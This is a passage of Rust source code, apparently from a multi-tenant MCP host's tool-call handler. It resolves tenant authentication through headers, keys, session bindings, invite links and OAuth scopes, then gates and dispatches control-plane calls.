        // (AC1, AC2, AC4, AC5): the last step of the precedence rule. Gated
        // on BOTH resolvers above having come back `Anonymous` -- a valid
        // header or a valid `tenant_key` has already won (AC5's "header
        // wins", AC4's "the explicit key's tenant"), and an *invalid*
        // explicit key is `Auth::Invalid`, so it keeps its own
        // `tenant_key_invalid` refusal instead of being quietly rescued by
        // the binding (AC4's second half).
        let session_id = session_id(parts);
        let mut via_session_binding = false;
        if via_tenant_key_arg
            && matches!(auth, Auth::Anonymous)
            && let Some(session_id) = session_id.as_deref()
            && let Some(bound) = resolve_session_binding(&self.state, session_id, &body_name)
                .await
                .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?
        {
            auth = bound;
            via_session_binding = true;
        }
        // PRD-mcphost-session-bound-tenant-key requirement 2/3 (AC2, AC3):
        // consulted only when every resolver above (header, `tenant_key`
        // argument, explicit signup/redeem session binding) still came back
        // `Anonymous`, and scoped exactly like the implicit-signup arm this
        // sits in front of below -- a `host.`/`billing.` name, on bare
        // `/mcp` (never a `/t/{ns}/mcp` request, which keeps its own
        // tenant-resource-metadata contract untouched). `implicit_signup_memory`
        // wins over `tenant_key_arg_memory` on the practical impossibility
        // of a session holding both: a connection's very first call is
        // either key-less (earns the former) or keyed (earns the latter),
        // and nothing ever writes the other map for an already-memoed
        // session.
        if via_tenant_key_arg
            && matches!(auth, Auth::Anonymous)
            && (body_name.starts_with("host.") || body_name.starts_with("billing."))
            && !is_feedback_tool(&body_name)
            && tenant_path_namespace(parts).is_none()
            && let Some(sid) = session_id.as_deref()
        {
            let now = now_unix();
            let remembered = self
                .state
                .implicit_signup_memory
                .lookup(sid, now)
                .map(|id| (id, true))
                .or_else(|| self.state.tenant_key_arg_memory.lookup(sid, now).map(|id| (id, false)));
            if let Some((tenant_id, from_implicit_signup)) = remembered {
                match self
                    .state
                    .db
                    .find_tenant_by_id(tenant_id)
                    .await
                    .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?
                {
                    Some(t) if is_refused_disabled(&t, &body_name) => {
                        self.state.implicit_signup_memory.drop_binding(sid);
                        self.state.tenant_key_arg_memory.drop_binding(sid);
                        return Err(AppError::TenantDisabled { disabled_reason: t.disabled_reason.clone(), claim_url: None }.into_error_data_at(Some(&self.state.public_url)));
                    }
                    // A self-offboarded tenant calling its own lifecycle verb
                    // again (`auth_shape`): served, so the verb answers
                    // idempotently.
                    Some(t) if t.disabled => {
                        auth = Auth::Tenant(Box::new(t), None);
                        via_session_binding = true;
                    }
                    // Requirement 2's config escape hatch: serve the call as
                    // the remembered tenant instead of refusing it --
                    // `via_session_binding` is reused rather than a new flag
                    // (same downstream `calls_auth_method`/"session" label
                    // AC3's own "runs as A with auth: session" asks for).
                    Some(t) if self.state.reuse_session_tenant.load(std::sync::atomic::Ordering::Relaxed) => {
                        if let Err(e) = self.state.db.touch_last_seen(t.id, now_unix()).await {
                            tracing::warn!(error = %e, tenant = %t.namespace, "failed to bump last_seen_unix");
                        }
                        auth = Auth::Tenant(Box::new(t), None);
                        via_session_binding = true;
                    }
                    // Default ("refuse-and-name"): no tenant is created,
                    // the refusal names the tenant this connection already
                    // is (AC2, AC3) -- and (AC2 only) a blocked second
                    // IMPLICIT signup is counted, never a blocked
                    // tenant_key-argument omission (AC3 carries no such
                    // count in its own Then).
                    Some(t) => {
                        if from_implicit_signup
                            && let Err(e) =
                                self.state.db.record_blocked_implicit_second_signup(source.clone()).await
                        {
                            tracing::warn!(error = %e, tenant = %t.namespace, "failed to record implicit_second_signup_blocked");
                        }
                        tracing::warn!(
                            tenant = %t.namespace,
                            tool = %body_name,
                            "host.* call refused: connection already named a tenant, tenant_key missing"
                        );
                        return Err(
                            AppError::TenantKeyMissing(crate::errors::Reason::ConnectionBound(t.namespace))
                                .into_error_data_at(Some(&self.state.public_url))
                        );
                    }
                    // The remembered tenant was deleted since: drop the
                    // stale binding(s) and fall through to ordinary
                    // resolution below (a fresh implicit signup can proceed,
                    // same as a connection with no memory at all).
                    None => {
                        self.state.implicit_signup_memory.drop_binding(sid);
                        self.state.tenant_key_arg_memory.drop_binding(sid);
                    }
                }
            }
        }
        // PRD-mcphost-webhook-inbox-one-call R3: no session memory above
        // caught this call, but this PEER completed `host.redeem`
        // within the last 10 minutes -- `/mcp` is stateless, so the redeem
        // left no session to remember. Refuse and name that tenant rather
        // than implicit-signup a second one. The pre-auth names stay served
        // (quickstart is the page that explains the rule).
        if via_tenant_key_arg
            && matches!(auth, Auth::Anonymous)
            && (body_name.starts_with("host.") || body_name.starts_with("billing."))
            && !crate::resume::ANON_SAFE_TOOLS.contains(&body_name.as_str())
            && !is_feedback_tool(&body_name)
            && tenant_path_namespace(parts).is_none()
            && crate::invites::invite_path_code(parts).is_none()
            && crate::tenant_clients::join_path_code(parts).is_none()
        {
            let peer = request_peer_key(parts);
            // PRD-mcphost-implicit-signup-per-session-not-per-peer R2: the gate
            // holds a request that presented no host-minted session, or the
            // very session that redeemed. A request presenting a DIFFERENT
            // host-minted session is another agent behind the same address and
            // reaches implicit signup. `SessionPresented` is false for a forged
            // or foreign id (the transport replaced it), so a forged header
            // never turns the gate off.
            let presented = parts.extensions.get::<crate::session_bind::SessionPresented>().is_some_and(|p| p.0);
            let recent = self.state.redeemed_peers.lookup(&peer, now_unix());
            let yields = recent
                .as_ref()
                .is_some_and(|(_, redeemer)| presented && redeemer.as_deref() != session_id.as_deref());
            if yields {
                // R5: the journal splits a yield (a session of its own) from a
                // refusal (none); neither line names a key or a namespace.
                tracing::info!(
                    peer_recent_yielded = true,
                    tool = %body_name,
                    "host.* call proceeds to implicit signup: peer redeemed recently but this request presents a different session"
                );
            }
            if !yields && let Some((namespace, _)) = recent {
                match self.state.db.find_tenant_by_namespace(namespace.clone()).await {
                    Ok(Some(t)) if !t.disabled => {
                        tracing::warn!(
                            session_presented = presented,
                            tool = %body_name,
                            "host.* call refused: peer just redeemed, request presented no session of its own"
                        );
                        Box::pin(self.note_implicit_peer_refused(parts)).await;
                        return Err(AppError::TenantKeyMissing(crate::errors::Reason::PeerRecent)
                            .into_error_data_at(Some(&self.state.public_url)));
                    }
                    // A self-offboarded or idle-expired tenant no longer blocks a fresh start.
                    Ok(Some(t)) if crate::auth_shape::frees_peer(t.disabled_reason.as_deref()) => {
                        self.state.redeemed_peers.forget(&peer);
                    }
                    Ok(Some(t)) => {
                        self.state.redeemed_peers.forget(&peer);
                        return Err(AppError::TenantDisabled { disabled_reason: t.disabled_reason.clone(), claim_url: None }.into_error_data_at(Some(&self.state.public_url)));
                    }
                    Ok(None) => self.state.redeemed_peers.forget(&peer),
                    Err(e) => return Err(e.into_error_data_at(Some(&self.state.public_url))),
                }
            }
        }
        // PRD-mcphost-invite-links requirement 2 (AC2), requirement 6: a
        // genuinely fresh session on `/i/{code}/mcp` -- no header, no
        // `tenant_key` argument, and (just checked above) no existing
        // session binding -- gets its tenant created right here, from the
        // invite's own inviter context, rather than falling into the
        // ordinary Anonymous-refusal arm below. `signup`/`host.redeem` are
        // excluded: they already have their own creation path, and
        // running both would mint two tenants for one call. Once this
        // session is bound (inside `claim_on_first_call`), every later
        // call on it resolves through `resolve_session_binding` above and
        // never reaches here again.
        let mut invite_onboarding: Option<Value> = None;
        if matches!(auth, Auth::Anonymous)
            && body_name != "signup"
            && body_name != "host.redeem"
            && let Some(code) = crate::invites::invite_path_code(parts)
        {
            // PRD-mcphost-funnel-truth AC1: this is a tenant-creating
            // handler too -- same header/fleet-IP classification
            // `control::signup` does inline, computed here since
            // `claim_on_first_call` has no other reason to reach back into
            // `handler.rs`'s own header/IP extraction helpers.
            let probe_header = origin_header(parts)
                .as_deref()
                .is_some_and(|h| h.trim().eq_ignore_ascii_case("probe"));
            let funnel_origin =
                crate::state::classify_funnel_origin(&source, probe_header, &self.state.fleet_ips);
            let (tenant, onboarding) = crate::invites::claim_on_first_call(
                &self.state,
                code,
                session_id.as_deref(),
                funnel_origin,
            )
            .await
            .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?;
            auth = Auth::Tenant(Box::new(tenant), None);
            invite_onboarding = Some(onboarding);
        }
        // PRD-mcphost-same-user-second-agent R3 (AC1, AC2, AC7): a fresh
        // session on `/j/{code}/mcp` -- nothing resolved above -- becomes a
        // sibling client of the code's tenant right here. The join binds the
        // session (tenant + client), so every later call on it resolves
        // through the ordinary session binding and never reaches here again.
        let mut joined_client_id: Option<String> = None;
        if matches!(auth, Auth::Anonymous)
            && body_name != "signup"
            && body_name != "host.redeem"
            && let Some(code) = crate::tenant_clients::join_path_code(parts)
        {
            let (tenant, client, onboarding) = crate::tenant_clients::join_on_first_call(
                &self.state,
                code,
                session_id.as_deref(),
                peer_client_info(&ctx),
            )
            .await
            .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?;
            auth = Auth::Tenant(Box::new(tenant), None);
            invite_onboarding = Some(onboarding);
            joined_client_id = Some(client.id);
        }
        // PRD-mcphost-url-bound-tenants requirement 1 (AC7): a request on
        // `/u/{secret}/mcp` that ALSO carries an `Authorization: Bearer` for
        // a different tenant than the path secret's own is refused outright
        // -- never silently resolved to either credential, and dispatch
        // never runs. Compares raw tenant keys only (the realistic shape of
        // a credential presented alongside a URL secret, same convention as
        // the `tenant_key`-argument-vs-header conflict check below); an
        // absent or unrecognized bearer is not a conflict.
        if via_url_secret
            && let Auth::Tenant(path_tenant, _) = &auth
            && let Some(key) = crate::auth::extract_bearer(&parts.headers)
        {
            let hash = hash_key(&key);
            if let Ok(Some(header_tenant)) = self.state.db.find_tenant_by_key_hash(hash).await
                && header_tenant.id != path_tenant.id
            {
                return Err(AppError::AuthConflict.into_error_data_at(Some(&self.state.public_url)));
            }
        }
        // PRD-mcphost-tenant-resource-metadata requirement 1 (AC2, AC3): a
        // real tenant (key- or JWT-resolved alike) whose namespace doesn't
        // match a `/t/{ns}/mcp` path's own `<ns>` is refused before any
        // dispatch below, key and JWT credentials alike.
        if let Auth::Tenant(tenant, _) = &auth
            && let Some(ns) = tenant_path_namespace(parts)
            && tenant.namespace != ns
        {
            return Err(AppError::WrongTenant.into_error_data_at(Some(&self.state.public_url)));
        }
        // PRD-mcphost-tenant-resource-metadata requirement 4 (AC5): a
        // bearer JWT's `scope` claim, when present, must contain `mcp` --
        // spec 2026-07-28's own RFC 6750 §3 challenge vocabulary. A token
        // with no `scope` claim at all (`oauth_caller.scope` is `None`) is
        // unrestricted, same as every pre-existing OAuth test's tokens
        // (none of which ever set one).
        //
        // PRD-mcphost-tool-scopes-and-consent requirement 3/4 (AC2, AC6):
        // this blanket "must have mcp" gate is now the control-plane
        // default only -- a call to the caller's OWN namespaced tool
        // (`<tenant.namespace>.<local>`) is gated instead by
        // `call_published_tool`'s own fine-grained per-tool check (that
        // tool's declared `scopes`, not a flat `mcp` requirement), so it's
        // skipped here rather than refusing a validly `read`-scoped call
        // to a `read`-scoped tool before dispatch ever sees which tool it
        // is.
        if let Auth::Tenant(tenant, Some(oauth_caller)) = &auth
            && let Some(scope) = &oauth_caller.scope
            && !crate::scopes::check(Some(scope), &crate::scopes::control_plane_requirement(&body_name))
            && !body_name.starts_with(&format!("{}.", tenant.namespace))
        {
            return Err(AppError::InsufficientScope.into_error_data_at(Some(&self.state.public_url)));
        }
        // PRD-mcphost-oauth-resource-server requirement 7 / AC8: the header
        // already won (requirement 5/6's usual precedence -- `auth` above
        // is already resolved from it), but when it won via an OAuth
        // bearer (a subject is present) a `tenant_key` argument is still
        // read here and compared: two valid, DIFFERENT tenants is a
        // `conflicting_credentials` refusal, never a silent pick of one.
        // An absent, non-string, or unrecognized `tenant_key` is not a
        // conflict (the PRD's own "both ... valid") and changes nothing.
        if let Auth::Tenant(header_tenant, Some(_)) = &auth
            && let Some(key) = raw_args.get("tenant_key").and_then(Value::as_str)
        {
            let hash = hash_key(key);
            if let Ok(Some(key_tenant)) = self.state.db.find_tenant_by_key_hash(hash).await
                && key_tenant.id != header_tenant.id
            {
                return Err(AppError::ConflictingCredentials.into_error_data_at(Some(&self.state.public_url)));
            }
        }
        // PRD-mcphost-tenant-attribution requirement 2's "first
        // authenticated session if signup preceded capture" fallback: an
        // already-authenticated tenant with no captured client yet gets
        // one more chance, on whatever call this happens to be, from this
        // same session's peer info. `Db::set_tenant_client_info` itself
        // guards against a race with signup's own capture (its `WHERE
        // client_name IS NULL` only ever writes once). Best-effort: a
        // failure here must never fail the call it rides along with.
        if let Auth::Tenant(tenant, _) = &auth
            && tenant.client_name.is_none()
            && let Some((name, version)) = peer_client_info(&ctx)
        {
            let _ = self.state.db.set_tenant_client_info(tenant.id, name, version).await;
        }
        // PRD-mcphost-key-scoped-to-tools R3: rows this call writes to
        // `calls` carry the sub-key's id, and a call outside its allowlist
        // (or on the always-refused set) is `permission_denied` before any
        // dispatch below runs.
        if let (Some(sk), Auth::Tenant(tenant, _)) = (&sub_key, &auth) {
            let _ = crate::subkeys::CALL_KEY.try_with(|c| c.set(Some(sk.id)));
            // PRD-mcphost-acting-for-in-ledger-and-audit R1: the lineage is
            // rendered once here and read by every decorator below.
            if let Some(e) = self.record_acting_for(sk.id).await {
                return Err(*e);
            }
            let canonical = crate::tool_aliases::resolve(&body_name).unwrap_or(&body_name);
            // `host.key.delegate` skips the allowlist: it answers
            // `permission_denied can_delegate=false` itself.
            if canonical != "host.key.delegate" && !sk.permits(&tenant.namespace, canonical) {
                return Err(sk.denied(canonical).into_error_data_at(Some(&self.state.public_url)));
            }
            if !sk.scope_ok(canonical) {
                return Err(sk.scope_denied(canonical).into_error_data_at(Some(&self.state.public_url)));
            }
            // PRD-mcphost-delegation-bound-to-run-or-session R3: a bound key
            // is refused anywhere but its run / session, before any call row.
            // `host.whoami` stays open so a helper can read its own binding.
            if canonical != "host.whoami" {
                let seen_run = crate::subkeys::seen_run_id(canonical, &raw_args, request.meta.as_ref().map(|m| &m.0.0));
                sk.check_bound(session_id.as_deref(), seen_run.as_deref())
                    .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?;
                if sk.bound.as_ref().is_some_and(|(kind, _)| kind == "session")
                    && let Err(e) = self.state.db.touch_bound_session(sk.id, now_unix()).await
                {
                    tracing::warn!(error = %e, "failed to bump bound session last_seen");
                }
            }
        }
        // PRD-mcphost-abuse-guard-ban-list requirement 2 / AC2: every
        // authenticated tool call (header or tenant_key-argument alike)
        // checks the caller's key before dispatch -- before any
        // `dispatch_tenant_tool`/`call_published_tool` path could write a
        // `calls` row (AC2's "the call is not recorded in calls"). Excludes
        // `signup` alone: it's reachable regardless of `auth` (the match
        // arm below matches on `body_name` before `auth` at all), and a
        // resolved `Auth::Tenant` here only ever means a caller happened to
        // send a valid `tenant_key` argument alongside an otherwise
        // unauthenticated call signup never needs.
        if let Auth::Tenant(tenant, _) = &auth
            && body_name != "signup"
            && let Err(err) = crate::bans::enforce(&self.state, "key", &tenant.key_hash).await
        {
            tracing::warn!(code = err.code(), tenant = %tenant.namespace, tool = %body_name, "call refused: tenant banned");
            return Err(err.into_error_data_at(Some(&self.state.public_url)));
        }
        // PRD-mcphost-external-class-positive-evidence: a later-day return is
        // the second way an `unattributed` tenant earns `external`; its own
        // `Box::pin`'d fn keeps this future under the size bound.
        if let Auth::Tenant(tenant, _) = &auth
            && body_name != "signup"
        {
            Box::pin(self.note_origin_evidence(parts, tenant, &source)).await;
        }
        // PRD-mcphost-end-user-identity requirement 1/2: resolved once,
        // before dispatch, from either the OAuth bearer this call's `auth`
        // already carries (requirement 1) or a verified `end_user_assertion`
        // argument for a key-based caller (requirement 2). AC3: an
        // assertion present but invalid refuses the WHOLE call
        // (`end_user_assertion_invalid`) before any dispatch arm below
        // runs, never falling back to "no end user".
        let mut end_user: Option<crate::enduser::EndUser> = None;
        let mut end_user_err: Option<AppError> = None;
        if let Auth::Tenant(tenant, oauth_caller) = &auth {
            if let Some(oauth_caller) = oauth_caller {
                // PRD-mcphost-hosted-authorization-server requirement 5: a
                // hosted-token bearer (this host's own built-in issuer)
                // gets `EndUserMethod::HostedOauth`, never the
                // bring-your-own-issuer `Oauth` variant.
                // PRD-mcphost-federated-end-user-login requirement 3: a
                // federated end-user token gets `EndUserMethod::Federated`.
                // PRD-mcphost-enterprise-managed-auth requirement 5: a
                // token minted from an identity assertion gets
                // `EndUserMethod::EnterpriseAssertion` instead.
                let method = match oauth_caller.auth_method {
                    "hosted_token" => crate::enduser::EndUserMethod::HostedOauth,
                    "federated" => crate::enduser::EndUserMethod::Federated,
                    "enterprise_assertion" => crate::enduser::EndUserMethod::EnterpriseAssertion,
                    _ => crate::enduser::EndUserMethod::Oauth,
                };
                end_user = Some(crate::enduser::EndUser {
                    subject: oauth_caller.subject.clone(),
                    issuer: Some(oauth_caller.issuer.clone()),
                    method,
                    verified_at: now_unix(),
                    email: oauth_caller.email.clone(),
                    name: oauth_caller.name.clone(),
                });
            } else if let Some(assertion) = raw_args.get("end_user_assertion").and_then(Value::as_str) {
                match crate::enduser::verify_assertion(&self.state, tenant, assertion).await {
                    Ok(eu) => end_user = Some(eu),
                    Err(e) => end_user_err = Some(e),
                }
            }
            // PRD-mcphost-end-user-audit-and-revoke requirement 4 (AC4): a
            // revoked end user's next identified call is refused before
            // dispatch -- no tool runs, no `calls` row. One indexed lookup
            // on `end_users`' own primary key (technical considerations).
            if end_user_err.is_none()
                && let Some(eu) = &end_user
            {
                match self.state.db.is_end_user_revoked(tenant.id, eu.subject.clone()).await {
                    Ok(true) => {
                        end_user_err = Some(AppError::Structured {
                            code: END_USER_REVOKED,
                            message: format!("end user '{}' has been revoked", eu.subject),
                            data: json!({"subject": eu.subject}),
                        });
                    }
                    Ok(false) => {}
                    Err(e) => end_user_err = Some(e),
                }
            }
        }
        // requirement 2: `end_user_assertion` is a call-framing argument,
        // never a tool's own -- stripped before schema validation/dispatch,
        // same "reserved key inside the call args" shape `version` already
        // uses (see the cross-tenant match arm below), so its value never
        // reaches a tool's own args or a persisted log line.
        let raw_args = match raw_args {
            Value::Object(mut map) => {
                map.remove("end_user_assertion");
                Value::Object(map)
            }
            other => other,
        };
        // PRD-mcphost-idempotency-key-on-call R1: the key rides in `_meta`
        // or `args.__idempotency_key` (stripped here, before schema
        // validation and the args hash).
        let mut raw_args = raw_args;
        let idem_key = crate::idempotency::extract_key(request.meta.as_ref().map(|m| &m.0.0), &mut raw_args)
            .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?;

        let attempt = crate::retry_policy::attempt_from_meta(request.meta.as_ref().map(|m| &m.0.0).or(Some(&ctx.meta.0)));

        // Requirements 16/17: redacted by key name, recursively, exactly
        // once here, so every dispatch branch below -- a `host.*` tool, an
        // `admin.*` tool, or a direct namespaced call -- works from
        // arguments that can no longer carry the key, at any depth (AC19),
        // rather than each callee having to remember to do it itself.
        let args = crate::secrets::redact_keys(&raw_args, &["tenant_key"]);
        // PRD-mcphost-host-tool-deprecation requirement 3 / AC4: computed
        // from `args` before the dispatch match below moves it into
        // whichever arm handles `body_name` -- applied to the successful
        // result after the match instead.
        let deprecation_notices =
            crate::api_contract::deprecation_notices(&body_name, &args, &self.state.deprecations);
        // PRD-mcphost-invite-links requirement 14 (AC13): the owner
        // namespace of a cross-tenant shared-tool call, however it was
        // dispatched -- a raw qualified `tools/call` (`name:
        // "<owner_ns>.<local>"`) or the `host.tool.call`/`host.tool_call`
        // wrapper (`{name: "<owner_ns>.<local>"}` inside `args`). Computed
        // here, before the dispatch match below moves `args`, same
        // "snapshot now, apply after the match" convention
        // `deprecation_notices`/`alias_canonical` already use.
        let shared_tool_call_owner_ns: Option<String> = if let Auth::Tenant(tenant, _) = &auth {
            let qualified = if body_name.starts_with("host.") || body_name.starts_with("billing.") {
                match body_name.as_str() {
                    "host.tool.call" | "host.tool_call" => {
                        args.get("name").and_then(Value::as_str).map(str::to_string)
                    }
                    _ => None,
                }
            } else {
                Some(body_name.clone())
            };
            qualified.and_then(|q| {
                q.split_once('.')
                    .filter(|(ns, _)| *ns != tenant.namespace)
                    .map(|(ns, _)| ns.to_string())
            })
        } else {
            None
        };
        // PRD-mcphost-tool-naming-convention-and-aliases requirement 2:
        // `Some(canonical)` iff `body_name` is a registered alias --
        // resolved once here (before the dispatch match moves `body_name`
        // into whichever arm handles it) so dispatch below always matches
        // on the canonical name, and the success handler after the match
        // can still tell an alias call from a canonical one to attach the
        // deprecation hint / log / metric.
        let alias_canonical = crate::tool_aliases::resolve(&body_name);

        // PRD-mcphost-feedback-tool-and-ledger requirement 2: this
        // connection's call-id ring. Feedback verbs read it, every other
        // call extends it.
        let feedback_ring_key = match &auth {
            Auth::Tenant(t, _) => crate::feedback::ring_key_tenant(t.id),
            _ => crate::feedback::ring_key_anonymous(session_id.as_deref(), &source),
        };
        if !is_feedback_tool(&body_name) {
            self.state.feedback_calls.push(&feedback_ring_key);
        }
        // PRD-mcphost-idempotency-key-on-call R2-R5: claim the key before
        // dispatch; a finished row with the same args replays instead of
        // running the tool.
        let mut idem_guard: Option<crate::idempotency::ClaimGuard> = None;
        let mut replayed_at: Option<i64> = None;
        let mut replay_outcome: Option<Result<Value, AppError>> = None;
        let mut replay_usage: Option<Value> = None;
        if let (Some(key), Auth::Tenant(tenant, _)) = (idem_key.as_deref(), &auth) {
            let sha = crate::idempotency::args_sha256(&args);
            // R5: a second concurrent caller polls the first's pending row
            // (30 s max; `idem_claim` takes over a claim older than that).
            let wait_started = Instant::now();
            let claim = loop {
                let claim = self
                    .state
                    .db
                    .idem_claim(tenant.id, &body_name, key, &sha)
                    .await
                    .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?;
                if matches!(claim, crate::idempotency::Claim::Pending)
                    && wait_started.elapsed() < Duration::from_secs(crate::idempotency::WAIT_MAX_SECS as u64 + 1)
                {
                    tokio::time::sleep(Duration::from_millis(25)).await;
                    continue;
                }
                break claim;
            };
            match claim {
                crate::idempotency::Claim::Run => {
                    idem_guard = Some(crate::idempotency::ClaimGuard::new(
                        self.state.db.clone(),
                        tenant.id,
                        &body_name,
                        key,
                    ));
                }
                crate::idempotency::Claim::Replay(stored) => {
                    replayed_at = Some(stored.first_seen_unix);
                    // R3: a `calls` row marks the replay for the digest.
                    if let Err(e) = self
                        .state
                        .db
                        .record_call(
                            tenant.id,
                            body_name.clone(),
                            0,
                            stored.outcome.is_ok(),
                            Some("replayed".to_string()),
                            None,
                            None,
                            "ok",
                            tenant.origin.clone(),
                            tenant.origin_detail.clone(),
                        )
                        .await
                    {
                        tracing::warn!(error = %e, tool = %body_name, "failed to record replayed call");
                    }
                    replay_usage = stored.usage;
                    replay_outcome = Some(stored.outcome);
                }
                crate::idempotency::Claim::Conflict { stored_args_sha256 } => {
                    replay_outcome = Some(Err(crate::idempotency::conflict_error(key, &stored_args_sha256, &sha)));
                }
                _ => {}
            }
        }
        // PRD-mcphost-host-args-validated-by-default R5 (open question 3): the
        // verbs the match below answers WITHOUT `dispatch_tenant_tool_inner`
        // (reachable before signup) are validated by the same descriptor here.
        // A `NoDryRun` write verb answers `dry_run: true` with its refusal
        // (`data.no_dry_run_reason`) before the descriptor validator, the same
        // order `dispatch_tenant_tool_dry_run` keeps for every other verb
        // (dryv_ac02: `host.feedback.send` is pre-dispatch and `external_effect`).
        let no_dry_run_refusal = crate::write_verbs::lookup(&body_name).and_then(|verb| match verb.dry_run {
            crate::write_verbs::DryRun::NoDryRun(reason) if crate::write_verbs::dry_run_requested(&args) => {
                Some(crate::write_verbs::no_dry_run_error(verb, reason))
            }
            _ => None,
        });
        let pre_dispatch_gate: Result<(), AppError> = if let Some(err) = no_dry_run_refusal
            && is_pre_dispatch_tool(&body_name)
        {
            Err(err)
        } else if is_pre_dispatch_tool(&body_name) {
            let namespace = match &auth {
                Auth::Tenant(tenant, _) => tenant.namespace.as_str(),
                _ => "",
            };
            crate::precheck::precheck_args(&self.state.kinds, &body_name, &args)
                .inspect(|()| crate::host_args::note_handler_run(namespace, &body_name))
        } else {
            Ok(())
        };
        // PRD-mcphost-onboarding-dead-ends-zero R1: the tool a running verb
        // targets, so a kind-level error from it (`args_invalid`,
        // `tool_exception`, `upstream_status`) can name it in `next_call`.
        let ran_tool: Option<String> = match body_name.as_str() {
            "host.tool.call" | "host.tool_call" | "host.tool.test" | "host.tool_test" | "host.tool.run"
            | "host.tool_run" => args.get("name").and_then(Value::as_str).map(str::to_string),
            name if name.starts_with("host.")
                || name.starts_with("billing.")
                || name.starts_with("admin.")
                || name == "signup" =>
            {
                None
            }
            name => Some(name.to_string()),
        };
        let ran_tool = ran_tool.map(|tool| {
            let namespace = match &auth {
                Auth::Tenant(tenant, _) => tenant.namespace.as_str(),
                _ => "",
            };
            crate::next_call::caller_tool_name(namespace, &tool).to_string()
        });
        let outcome: Result<Value, AppError> = if let Some(replayed) = replay_outcome {
            replayed
        } else if let Some(err) = end_user_err {
            Err(err)
        } else if let Err(err) = pre_dispatch_gate {
            Err(err)
        } else {
            match (&auth, body_name.as_str()) {
            (_, "signup") => {
                let (client_name, client_version) = match peer_client_info(&ctx) {
                    Some((name, version)) => (Some(name), Some(version)),
                    None => (None, None),
                };
                let created = control::signup(
                    &self.state,
                    &args,
                    &source,
                    control::SignupAttribution {
                        synthetic_header: synthetic_header(parts).as_deref(),
                        client_name: client_name.as_deref(),
                        client_version: client_version.as_deref(),
                        user_agent: user_agent_header(parts).as_deref(),
                        origin_header: origin_header(parts).as_deref(),
                    },
                )
                .await;
                // PRD-mcphost-session-bound-tenant-after-signup
                // requirements 1/6 (AC1, AC6): this session now IS that
                // tenant, and the response says so.
                bind_session_to_created_tenant(&self.state, session_id.as_deref(), &ctx.peer, created).await
            }
            // Requirement 4 / AC3-4: `host.quickstart` is readable before
            // signup, same as the rest of the `host.*` control plane in
            // `list_tools` -- an authenticated tenant gets its own
            // namespace filled in; anyone else gets the signup step, no
            // tenant data. Deliberately checked before the blanket
            // Anonymous/Invalid -> auth-error arm below, the same way
            // `signup` itself is.
            (Auth::Tenant(tenant, _), "host.quickstart") => self.quickstart_tenant_boxed(tenant, &args, &ctx, parts).await,
            (_, "host.quickstart") => self.quickstart_anonymous(&args, &ctx, parts),
            // PRD-mcphost-resume-tool R5: a caller with no tenant gets the
            // onboarding block, never an implicit signup (`ANON_SAFE_TOOLS`).
            (Auth::Anonymous, "host.resume") if tenant_path_namespace(parts).is_none() => {
                self.quickstart_anonymous(&args, &ctx, parts).map(crate::resume::anonymous)
            }
            // PRD-mcphost-help-search-tool R4: public text, no tenant data --
            // reachable anonymously (never implicit-signs-up) or as a tenant.
            // PRD-mcphost-docs-telemetry-failed-after-search R2: one
            // `help_search_events` row per call, `tenant_id` NULL when anonymous.
            (_, "host.help.search") => {
                let tenant_id = match &auth {
                    Auth::Tenant(t, _) => Some(t.id),
                    _ => None,
                };
                self.help_search_boxed(tenant_id, &args).await
            }
            // PRD-mcphost-emitted-doc-pointers-resolve R3: the section an
            // emitted anchor points at; same public, anonymous reach.
            (_, "host.help.get") => self.help_get_boxed(&args).await,
            // PRD-mcphost-errors-json-contract R4: public registry, no tenant
            // data -- the same object `GET /errors.json` serves, reachable
            // anonymously (never implicit-signs-up) or as a tenant.
            (_, "host.errors") => self.errors_boxed(&args).await,
            // PRD-mcphost-feedback-tool-and-ledger requirement 3: reachable
            // anonymously (never implicit-signs-up) or as a tenant.
            (Auth::Anonymous | Auth::Tenant(..), "host.feedback.send" | "host.feedback.list" | "host.feedback.get")
                if !(matches!(auth, Auth::Anonymous) && tenant_path_namespace(parts).is_some()) =>
            {
                let tenant_id = match &auth {
                    Auth::Tenant(t, _) => Some(t.id),
                    _ => None,
                };
                self.feedback_boxed(tenant_id, &ctx, &source, &feedback_ring_key, &body_name, &args).await?
            }
            // PRD-grand-loop-billing AC1: "billing.plans (anonymous and
            // tenant)" -- reachable exactly like host.quickstart, before
            // signup and regardless of auth, since it carries no
            // tenant-specific data.
            (_, "billing.plans") => Ok(crate::billing::plans(&self.state)),
            // PRD-mcphost-handoff-token requirement 2 / AC2: unauthenticated,
            // same treatment as `signup`/`host.quickstart` above -- the
            // caller has only a handoff_token, no tenant_key/Authorization
            // yet. Reads `raw_args` (not the redacted `args`): the token IS
            // the argument being authenticated by, so it can't be scrubbed
            // before `control::redeem` ever sees it (unlike `tenant_key`,
            // which this call never carries).
            (_, "host.redeem") => {
                // Requirement 1's "and on every tool that returns a fresh
                // `tenant_key` to the caller -- the handoff redeem path
                // included".
                let redeemed = control::redeem(&self.state, &raw_args).await;
                if let Ok(value) = &redeemed
                    && let Some(key) = value.get("key").and_then(Value::as_str)
                    && let Ok(Some(redeemed_tenant)) = self.state.db.find_tenant_by_key_hash(hash_key(key)).await
                {
                    self.state.redeemed_peers.record_at(
                        &request_peer_key(parts),
                        &redeemed_tenant.namespace,
                        session_id.as_deref(),
                        now_unix(),
                    );
                }
                bind_session_to_created_tenant(&self.state, session_id.as_deref(), &ctx.peer, redeemed).await
            }
            // PRD-mcphost-heal-action-registry-and-ledger R7: admin scope
            // only. Anonymous callers are refused (never implicit-signed-up:
            // the raw `trigger_json` is host-private) and tenants are forbidden.
            (Auth::Anonymous | Auth::Invalid, "host.incidents.list") => Err(AppError::Unauthorized),
            (Auth::Tenant(..), "host.incidents.list") => Err(AppError::Forbidden),
            // PRD-mcphost-docs-telemetry-failed-after-search R6: operator key only.
            (Auth::Anonymous | Auth::Invalid, "host.help.gaps") => Err(AppError::Unauthorized),
            (Auth::Tenant(..), "host.help.gaps") => Err(AppError::Forbidden),
            // PRD-mcphost-implicit-signup requirement 1 (AC1): a bare
            // `host.*`/`billing.*` call with no `Authorization` header, no
            // `tenant_key` argument, and (since no binding exists yet) no
            // session binding either -- mints a tenant exactly as `signup`
            // would, binds it to this session, and re-dispatches this very
